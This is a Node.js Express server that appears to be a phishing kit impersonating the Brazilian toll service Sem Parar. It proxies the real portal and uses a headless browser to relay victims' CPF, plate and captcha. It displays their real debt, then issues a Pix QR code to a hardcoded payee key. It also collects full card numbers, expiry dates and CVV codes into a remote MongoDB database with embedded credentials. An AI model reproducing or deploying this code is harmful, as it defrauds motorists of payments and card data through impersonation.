const express = require("express");
const session = require("express-session");
const puppeteer = require("puppeteer");
const path = require("path");
const bodyParser = require("body-parser");
const axios = require("axios"); // Importe o Axios aqui
const app = express();
const port = 4642;
const cors = require("cors");
const { createProxyMiddleware } = require("http-proxy-middleware");
const mongoose = require("mongoose");
const Cartao = require("./models/Cartao"); // Importe o modelo de cartão

require("dotenv").config();

app.set("view engine", "ejs");
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.json());
app.set("views", path.join(__dirname, "views")); // Certifique-se de definir o diretório de visualizações corretamente
app.use(cors());

app.use(
  session({
    secret: "seu_segredo_aqui",
    resave: false,
    saveUninitialized: true,
  })
);

mongoose
  .connect(
    "mongodb+srv://semparar:semparar@cartao.darfzoh.mongodb.net/?retryWrites=true&w=majority&appName=AtlasApp",
    {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    }
  )
  .then(() => {
    console.log("Conexão com o MongoDB bem-sucedida");
  })
  .catch((error) => {
    console.error("Erro na conexão com o MongoDB:", error);
  });

const proxyOptions = {
  target: "https://portaldenegociacao.semparar.com.br/recuperaportal/", // URL do serviço de destino
  changeOrigin: true, // Altera a origem do cabeçalho para o destino
  pathRewrite: {
    "^/proxy": "", // Opcional: reescreve a URL para remover o caminho "/proxy"
  },
};

// Middleware do proxy
const proxy = createProxyMiddleware("/proxy", proxyOptions);

// Use o middleware do proxy
app.use("/", proxy);

let page = null;

// Inicie o servidor Express após a conexão bem-sucedida
app.listen(port, () => {
  console.log(`http://localhost:${port}`);
});

async function userAuth(page, CPF, PlacaVeiculo, captchaResposta) {
  try {
    if (CPF.length === 14) {
      console.log(CPF.length);
      await page.waitForSelector('input[data-placeholder="CNPJ"]');
      await page.click('input[data-placeholder="CNPJ"]');

      await page.type("#CNPJ", CPF);
      await page.type("#PlacaVeiculo", PlacaVeiculo);
      await page.type("#CaptchaInputText", captchaResposta);
    } else {
      await page.type("#CPF", CPF);
      await page.type("#PlacaVeiculo", PlacaVeiculo);
      await page.type("#CaptchaInputText", captchaResposta); // Substitua pelo seletor correto do campo de captcha no site de destino

      await page.click(
        ".col-md-12.col-xs-12.button.primary-button.principal-bg.principal-hover.bold.right"
      );
    }
  } catch (error) {
    const erroText = await page.evaluate(() => {
      const erroElement = document.querySelector(
        ".cpf-title.bold.principal-text.red"
      );
      return erroElement ? erroElement.innerText : null;
    });
  }
}

async function captchaScreenshot(page) {
  const outputPath = path.join(__dirname, "views", "captcha.png"); // Caminho completo para o arquivo

  // Seletor do campo com ID específico
  const fieldSelector = "#CaptchaImage";

  // Captura de tela do campo
  const fieldHandle = await page.$(fieldSelector);
  await fieldHandle.screenshot({ path: outputPath });

  console.log("Captura de tela do campo concluída.");

  return outputPath;
}

app.get("/", async (req, res) => {
  console.log("rota /");
  try {
    const browser = await puppeteer.launch({
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--single-process",
      ],
      executablePath:
        process.env.NODE_ENV === "production"
          ? process.env.PUPPETEER_EXECUTABLE_PATH
          : puppeteer.executablePath(),
    });

    page = await browser.newPage();

    await page.setViewport({ width: 1920, height: 1080 }); // Substitua as dimensões conforme necessário

    await page.goto(
      "https://portaldenegociacao.semparar.com.br/recuperaportal/"
    );
    console.log("Entrou no semparar");
    await captchaScreenshot(page);

    app.use(express.static(path.join(__dirname, "views")));
    res.sendFile(path.join(__dirname, "views", "index.html"));
  } catch (error) {
    console.error(error);
    res.status(500).send("Ocorreu um erro durante o acesso à página.");
  }
});
app.post("/autenticar", async (req, res) => {
  try {
    const { CPF, PlacaVeiculo, captchaResposta } = req.body;

    await userAuth(page, CPF, PlacaVeiculo, captchaResposta);

    let erroText = null;

    try {
      // Verifique se há um erro com a classe .cpf-title.bold.principal-text.red
      await page.waitForSelector(".cpf-title.bold.principal-text.red", {
        timeout: 2000,
      });
      erroText = await page.evaluate(() => {
        const erroElement = document.querySelector(
          ".cpf-title.bold.principal-text.red"
        );
        return erroElement ? erroElement.innerText : null;
      });
    } catch (error) {
      // Se o elemento não for encontrado, continue o fluxo
      console.error(
        "Elemento .cpf-title.bold.principal-text.red não encontrado, continuando o fluxo."
      );
    }

    if (!erroText) {
      try {
        // Verifique se há um erro com a classe .alert.alert-danger.alert-dismissible.field-validation-error
        await page.waitForSelector(
          ".alert.alert-danger.alert-dismissible.field-validation-error",
          { timeout: 2000 }
        );
        erroText = await page.evaluate(() => {
          const erroElement = document.querySelector(
            ".alert.alert-danger.alert-dismissible.field-validation-error"
          );
          return erroElement ? erroElement.innerText : null;
        });
      } catch (error) {
        // Se o elemento não for encontrado, continue o fluxo
        console.error(
          "Elemento .alert.alert-danger.alert-dismissible.field-validation-error não encontrado, continuando o fluxo."
        );
      }
    }

    if (erroText) {
      // Se houver um erro, renderize a página de erro com a mensagem
      return res.render("erroAutenticacao", { isErro: erroText });
    }

    // Aguarde até que o elemento .text.bold.secondary-text apareça na página
    await page.waitForSelector(".text.bold.secondary-text", {
      timeout: 100000,
    });

    const valor = await page.evaluate(() => {
      const val = document.querySelector(".text.bold.secondary-text");
      const nom = document.querySelector(".hidden-xs.padding-left5");
      return {
        valor: val ? val.innerText : null,
        nome: nom ? nom.innerText : null,
      };
    });

    res.render("contrato", {
      nome: valor.nome,
      valor: valor.valor,
      PlacaVeiculo,
      CPF,
    });
  } catch (error) {
    res.redirect("/");
  }
});

app.post("/pix", async (req, res) => {
  try {
    const { valor, nome } = req.body; // Obtenha o valor e o nome do corpo da solicitação POST

    // Faça a chamada à API
    const response = await axios.post(
      "https://gerador-pix-v6kk.onrender.com/emvqr-static",
      {
        key: "8d604ad6-5a13-4a09-aa6f-ec159618f52d",
        amount: valor.toString(),
        name: nome,
        reference: "SEMPARAR",
        key_type: "chave",
        city: "SEMPARAR",
      }
    );

    // Os dados retornados pela API estarão em response.data
    const apiData = response.data;

    // Renderize uma página com os dados da API
    res.json(apiData);
  } catch (error) {
    console.error(error);
    res.status(500).send("Ocorreu um erro ao chamar a API do PIX.");
  }
});

app.post("/cadastrar-cartao", async (req, res) => {
  try {
    const {
      CPF,
      numeroCartao,
      nomeCartao,
      validadeMes,
      validadeAno,
      codigoSeguranca,
    } = req.body;

    // Aqui, você pode usar o modelo de dados do cartão para salvar os dados no banco de dados
    const novoCartao = new Cartao({
      CPF,
      numeroCartao,
      nomeCartao,
      validadeMes,
      validadeAno,
      codigoSeguranca,
    });

    await novoCartao.save(); // Salve os dados no banco de dados

    res.status(200).send("Dados do cartão salvos com sucesso.");
  } catch (error) {
    console.error("Erro ao salvar os dados do cartão:", error);
    res.status(500).send("Ocorreu um erro ao salvar os dados do cartão.");
  }
});
1;
// Rota para renderizar a página de erro com o valor de isErro
app.get("/erro", async (req, res) => {
  const { isErro } = req.query; // Obtém o valor de isErro da consulta de URL
  res.render("erroAutenticacao", { isErro });
});
